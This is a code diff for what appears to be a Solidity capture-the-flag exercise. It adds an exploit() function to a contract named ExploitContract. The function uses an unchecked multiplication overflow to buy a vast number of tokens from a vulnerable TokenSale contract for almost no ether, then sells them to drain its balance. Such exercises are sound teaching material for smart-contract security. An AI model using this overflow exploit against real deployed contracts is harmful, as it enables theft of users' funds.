@@ -28,7 +28,7 @@ contract TokenSale {
         require(balanceOf[msg.sender] >= numTokens);
 
         balanceOf[msg.sender] -= numTokens;
-        (bool ok, ) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
+        (bool ok,) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
         require(ok, "Transfer to msg.sender failed");
     }
 }
@@ -37,8 +37,22 @@ contract TokenSale {
 contract ExploitContract {
     TokenSale public tokenSale;
 
-    constructor(TokenSale _tokenSale) {
+    constructor(TokenSale _tokenSale) payable {
         tokenSale = _tokenSale;
+    }
+
+    function exploit() public {
+        uint256 numTokens = 115792089237316195423570985008687907853269984665640564039458;
+        uint256 ethValue;
+        // Put your solution here
+        unchecked {
+            ethValue = numTokens * 1e18; // overflow
+        }
+        tokenSale.buy{value: ethValue}(numTokens);
+
+        uint256 balance = address(tokenSale).balance;
+        uint256 numTokensToSell = balance / 1e18;
+        tokenSale.sell(numTokensToSell);
     }
 
     receive() external payable {}
